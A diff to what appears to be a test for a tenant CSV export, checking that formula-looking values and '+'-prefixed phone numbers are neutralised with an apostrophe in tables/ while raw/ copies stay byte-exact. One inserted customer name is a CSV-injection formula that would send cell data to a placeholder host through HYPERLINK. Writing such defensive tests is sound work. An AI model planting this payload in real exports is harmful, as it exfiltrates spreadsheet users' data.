@@ -35,6 +35,9 @@ async function main() {
     }
     const a = firms.a;
     const b = firms.b;
+    // Formula-looking text (S-07): neutralised in tables/, byte-exact in raw/.
+    const formulaName = `=HYPERLINK("https://example.test/?d="&A1,"tıkla") ${a.marker}`;
+    const [formulaCustomer] = await db`INSERT INTO customers (tenant_id, full_name, phone, address) VALUES (${a.tenantId}, ${formulaName}, '+90 555 000 00 00', '-12.5') RETURNING id`;
 
     let summary: { rowCounts: Record<string, number>; fileCount: number } | null = null;
     const stream = tenantExportStream(db, a.tenantId, { now: new Date('2026-10-26T12:00:00Z'), onDone: (s) => { summary = s; } });
@@ -44,6 +47,22 @@ async function main() {
     for (const n of ['README.txt', 'tenant.csv', 'members.csv', 'files.csv', 'tables/customers.csv', 'tables/orders.csv', 'tables/invitations.csv']) assert.ok(names.includes(n), `${n} in the archive`);
     for (const n of ['tables/user_sessions.csv', 'tables/user_mfa.csv', 'tables/sso_providers.csv', 'tables/tenant_members.csv']) assert.ok(!names.includes(n), `${n} left out`);
     assert.ok(summary, 'onDone reports the summary');
+    for (const n of names.filter((x) => !x.startsWith('raw/') && x.endsWith('.csv'))) assert.ok(names.includes(`raw/${n}`), `raw/${n} in the archive`);
+    assert.equal(names.filter((x) => x.startsWith('raw/')).length, names.filter((x) => !x.startsWith('raw/') && x.endsWith('.csv')).length, 'one raw copy per CSV');
+
+    const safeCustomers = strFromU8(files['tables/customers.csv']);
+    const rawCustomers = strFromU8(files['raw/tables/customers.csv']);
+    const row = (csv: string) => csv.split('\r\n').find((l) => l.startsWith(formulaCustomer.id))!;
+    const quoted = (s: string) => `"${s.replace(/"/g, '""')}"`;
+    assert.ok(row(safeCustomers).includes(`,${quoted("'" + formulaName)},`), 'formula text gets a leading apostrophe in tables/');
+    assert.ok(row(safeCustomers).includes(",'+90 555 000 00 00,"), 'a phone starting with + is neutralised');
+    assert.ok(row(safeCustomers).includes(',-12.5,'), 'a plain number stays as it is');
+    assert.ok(row(rawCustomers).includes(`,${quoted(formulaName)},`) && row(rawCustomers).includes(',+90 555 000 00 00,'), 'raw/ keeps the value exactly');
+    assert.ok(!rawCustomers.includes("'="), 'raw/ has no apostrophes added');
+    // Rows without formula-looking text are identical in both copies; orders' numeric totals too.
+    assert.equal(strFromU8(files['raw/tables/orders.csv']), strFromU8(files['tables/orders.csv']));
+    assert.equal(strFromU8(files['raw/tenant.csv']), strFromU8(files['tenant.csv']));
+    assert.ok(strFromU8(files['README.txt']).includes('raw/'), 'README explains the two copies');
 
     const all = names.map((n) => strFromU8(files[n])).join('\n');
     // Firm A is there…
